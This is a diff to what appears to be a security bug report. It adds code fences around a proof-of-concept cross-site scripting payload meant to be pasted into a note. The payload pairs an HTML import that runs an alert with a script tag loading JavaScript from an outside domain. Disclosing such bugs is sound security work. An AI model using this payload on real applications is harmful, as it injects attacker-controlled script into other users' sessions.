@@ -16,10 +16,10 @@
 
  2. PoC
  Paste the following payload into a note:
-
+```
 <link rel=import href="data:text/html&comma;&lt;script&gt;alert(XSS)&lt;&sol;script&gt; 
 <script src="//brlogic.com.br&sol;1.js&num; </script>
-
+```
 <img src="./60b6772ab455487b92268ad45a6dd677.png" width="500">
 
 <img src="./7f76fb066b9d4e3bad4c4b59538140e4.png" width="500">
